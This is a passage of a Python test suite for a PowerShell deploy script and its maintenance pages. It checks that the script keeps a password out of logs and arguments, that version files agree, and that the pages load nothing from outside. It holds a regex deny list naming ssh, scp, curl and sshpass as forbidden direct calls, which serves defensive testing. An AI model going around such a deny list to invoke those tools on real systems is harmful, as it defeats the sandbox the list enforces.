            r"\b(ssh|scp|curl|tar|git|npm|sshpass)\.(exe|cmd)\b", r"Microsoft\.PowerShell\.\w+\\",
            r"&\s*['\"]?[A-Za-z]:[\\/]", r"&\s*['\"]?/(usr|bin)/",
        )
        for pattern in forbidden:
            match = re.search(pattern, code)
            assert match is None, f"deploy.ps1 calls around the sandbox: {match.group(0)!r}"


@pytest.mark.usefixtures("pwsh")
class TestTheNexusPassFile:
    """Get-NexusPass reads the file python-dotenv reads, and never says what it read."""

    SENTINEL = "s3ntinel"

    def _read(self, tmp_path, text):
        env_file = tmp_path / ".env"
        env_file.write_text(text, encoding="utf-8")
        proc = _pwsh(
            DOT_SOURCE
            + f'try {{ "RESULT:ok:$(Get-NexusPass -Path {_ps_literal(env_file)})" }} catch {{ "RESULT:threw:$($_.Exception.Message)" }}\n',
            check=True,
        )
        return proc.stdout

    @pytest.mark.parametrize("text, expected", [
        (f"# NEXUS_PASS=old\nNEXUS_PASS=first\nexport NEXUS_PASS=\"{SENTINEL} b\" # note\n", f"{SENTINEL} b"),
        (f"NEXUS_PASS={SENTINEL} # comment\n", SENTINEL),
        (f"NEXUS_PASS='{SENTINEL}'\n", SENTINEL),
        (f"NEXUS_PASS=\"{SENTINEL}\" # \"x\"\n", SENTINEL),
    ], ids=["export-last-quoted", "unquoted-comment", "single-quoted", "quoted-then-comment"])
    def test_it_reads_the_value_dotenv_reads(self, tmp_path, text, expected):
        assert f"RESULT:ok:{expected}\n" in self._read(tmp_path, text)

    @pytest.mark.parametrize("text", [
        f"nexus_pass={SENTINEL}\n", "NEXUS_PASS=\n", f"# NEXUS_PASS={SENTINEL}\n",
    ], ids=["wrong-case", "empty", "commented-out"])
    def test_it_refuses_without_quoting_the_file(self, tmp_path, text):
        out = self._read(tmp_path, text)
        assert "RESULT:threw:" in out and self.SENTINEL not in out, out

    def test_the_password_lives_in_sshpass_s_environment_for_one_call_only(self):
        proc = _pwsh(
            DOT_SOURCE
            + f"""
function global:sshpass {{
    Write-Host "SEEN-ARGS:$($args -join ' ')"
    Write-Host "SEEN-ENV:$env:SSHPASS"
    if ($global:Throw) {{ throw 'sshpass failed' }}
    $global:LASTEXITCODE = 0
}}
$global:NexusPass = '{self.SENTINEL}'
$global:Throw = $false
$null = Invoke-Remote -Exe 'ssh' -Arguments @('host', 'script')
"AFTER-CALL:$(Test-Path Env:SSHPASS)"
$global:Throw = $true
try {{ $null = Invoke-Remote -Exe 'ssh' -Arguments @('host', 'script') }} catch {{ }}
"AFTER-THROW:$(Test-Path Env:SSHPASS)"
""",
            check=True,
        )
        out = proc.stdout
        assert f"SEEN-ENV:{self.SENTINEL}" in out, out
        assert "SEEN-ARGS:-e ssh host script" in out and f"SEEN-ARGS:-e ssh host script {self.SENTINEL}" not in out, out
        assert "AFTER-CALL:False" in out and "AFTER-THROW:False" in out, out


# ── the versions agree ───────────────────────────────────────────────────────


def test_version_file_changelog_and_login_panel_agree():
    """`npm run build` already refuses when CHANGELOG.md's newest version is
    missing from the login-screen panel (frontend/scripts/
    check-changelog-freshness.mjs owns that heading rule); nothing checked
    VERSION against either. This does."""
    version = VERSION_FILE.read_text(encoding="utf-8").strip()
    assert re.fullmatch(r"\d+\.\d+\.\d+\.\d+", version), f"VERSION holds {version!r}, not a 4-part version"

    newest_md = re.search(r"^##\s*\[([\d.]+)\]", CHANGELOG_MD.read_text(encoding="utf-8"), re.M)
    assert newest_md, "CHANGELOG.md has no version heading"
    assert newest_md.group(1) == version, f"CHANGELOG.md's newest heading is {newest_md.group(1)}, VERSION says {version}"

    newest_js = re.search(r"version:\s*'([\d.]+)'", CHANGELOG_JS.read_text(encoding="utf-8"))
    assert newest_js, "changelog.js has no version entry"
    assert newest_js.group(1) == version, f"changelog.js's newest entry is {newest_js.group(1)}, VERSION says {version}"


# ── the maintenance page ─────────────────────────────────────────────────────
#
# Its colours and paths are held to styles/theme.js and vite.config.js by
# frontend/src/test/maintenancePage.test.js. These are its deploy contract;
# they read deploy.ps1's text rather than the rendered layout on purpose, so
# they run without pwsh.

#: Attributes whose value is a URL the browser fetches or navigates to.
URL_ATTRIBUTES = {"href", "src", "srcset", "action", "formaction", "poster", "background", "ping", "data", "cite", "manifest"}


class _PageAudit(html.parser.HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags, self.attributes, self.style = [], [], []
        self._in_style = False

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attributes.extend((tag, name, value or "") for name, value in attrs)
        self._in_style = tag == "style"

    def handle_endtag(self, tag):
        self._in_style = False

    def handle_data(self, data):
        if self._in_style:
            self.style.append(data)


class TestTheMaintenancePage:
    @pytest.fixture(scope="class")
    def html(self):
        assert MAINTENANCE_HTML.is_file(), (
            "frontend/public/maintenance.html is missing; Vite copies public/ "
            "into every build, which is how the page reaches the server"
        )
        return MAINTENANCE_HTML.read_text(encoding="utf-8")

    @pytest.fixture(scope="class")
    def audit(self, html):
        parser = _PageAudit()
        parser.feed(html)
        return parser

    @pytest.fixture(scope="class")
    def base(self):
        declared = re.search(r"const BASE = '([^']+)'", VITE_CONFIG.read_text(encoding="utf-8"))
        assert declared, "vite.config.js no longer declares `const BASE`"
        return declared.group(1)

    def test_it_carries_the_marker_the_script_looks_for_and_the_app_does_not(self, html, script_text):
        declared = re.search(r"^\$MaintenanceMarker\s*=\s*'([^']+)'", script_text, re.M)
        assert declared, "deploy.ps1 no longer declares $MaintenanceMarker"
        marker = declared.group(1)
        assert re.search(rf'<html[^>]*\s{re.escape(marker)}="1"', html), f"maintenance.html's <html> lacks {marker}=\"1\""
        # If the app's own index carried it, a raise would skip saving the
        # real index and overwrite it.
        assert marker not in APP_INDEX_HTML.read_text(encoding="utf-8"), f"frontend/index.html carries {marker}"

    def test_it_refreshes_itself_and_says_how_often(self, html):
        refresh = re.search(r'http-equiv="refresh"\s+content="(\d+)"', html)
        assert refresh, 'maintenance.html has no <meta http-equiv="refresh" content="N">'
        assert f"every {refresh.group(1)} seconds" in html, "the page's copy and its refresh interval disagree"

    def test_it_is_self_contained(self, audit, base):
        # Shown while things are down: nothing that can fail to load or run,
        # and nothing fetched from anywhere but the app's own path. (The
        # static host's CSP is report-only and not set from this repo, so
        # this is the page's own discipline.)
        assert not set(audit.tags) & {"script", "iframe", "object", "embed", "frame", "base"}, audit.tags
        style = "\n".join(audit.style)
        for tag, name, value in audit.attributes:
            where = f"<{tag} {name}={value!r}>"
            assert not name.startswith("on"), f"inline event handler: {where}"
            assert name != "style", f"inline style escapes the colour audit: {where}"
            assert "javascript:" not in value.lower() and "data:" not in value.lower(), where
            if name in URL_ATTRIBUTES:
                assert value.startswith(base), f"fetches from outside {base}: {where}"
            if tag == "meta" and name == "content" and "url" in value.lower():
                assert False, f"a refresh that navigates elsewhere: {where}"
        assert "@import" not in style, "the <style> block imports a stylesheet"
        for url in re.findall(r"url\(\s*['\"]?([^'\")]*)", style):
            assert url.startswith(base), f"the <style> block fetches {url}"
        # A bundle asset would break the page between the promote and the lift.
        assert "/assets/" not in style and not any("/assets/" in value for _, _, value in audit.attributes)

    def test_it_tells_the_truth_about_sessions(self, html):
        lowered = " ".join(html.lower().split())
        for claim in ("saved games are kept", "anything you had not saved is lost", "will need to sign in again"):
            assert claim in lowered, f"maintenance.html no longer says {claim!r}"
        assert "not need to sign in" not in lowered

    def test_it_is_a_complete_mobile_ready_document(self, html):
        assert re.search(r"<html[^>]*\blang=", html), "maintenance.html has no lang"
        assert 'name="viewport"' in html, "maintenance.html has no viewport meta"
        assert re.search(r"prefers-reduced-motion:\s*reduce\)\s*\{[^}]*animation:\s*none", html), (
            "maintenance.html does not stop its animations under prefers-reduced-motion"
        )


class TestTheSavesResetPage:
    """-SavesReset: the maintenance page for a release that clears every cloud
    save, which the default page would contradict ("kept on the server").

    It is a copy of maintenance.html that differs in ONE paragraph, and this
    class holds it to that: everything the frontend's theme audit and
    TestTheMaintenancePage prove of the default page then holds of this one."""

    SAVES_SENTENCE = "Your saved games are kept on the server."

    @staticmethod
    def _paragraphs(html):
        return re.findall(r"<p>(.*?)</p>", html, re.S)

    def _notice(self):
        default = self._paragraphs(MAINTENANCE_HTML.read_text(encoding="utf-8"))
        replaced = [p for p in self._paragraphs(SAVES_RESET_HTML.read_text(encoding="utf-8")) if p not in default]
        assert len(replaced) == 1, replaced
        return replaced[0]

    def test_it_differs_from_the_default_page_in_the_saves_paragraph_only(self):
        default = MAINTENANCE_HTML.read_text(encoding="utf-8")
        (kept,) = [p for p in self._paragraphs(default) if self.SAVES_SENTENCE in p]
        reset = SAVES_RESET_HTML.read_text(encoding="utf-8")
        assert reset.replace(self._notice(), kept, 1) == default

    def test_it_does_not_promise_the_saves_it_clears(self):
        notice = self._notice()
        assert "kept" not in notice.lower(), notice
        assert "will not carry over" in notice and "sign in again" in notice, notice

    def test_the_stage_puts_it_up_under_saves_reset(self, pwsh):
        reset = _pwsh(DOT_SOURCE.rstrip("\n") + " -SavesReset\n" + f"New-StageScript -Sha '{FAKE_SHA}'\n", check=True).stdout
        assert f"cp {STAGING_DIR}/maintenance-saves-reset.html {STAGING_DIR}/index.html" in reset, reset
        default = _pwsh(DOT_SOURCE + f"New-StageScript -Sha '{FAKE_SHA}'\n", check=True).stdout
        assert f"cp {STAGING_DIR}/maintenance.html {STAGING_DIR}/index.html" in default, default
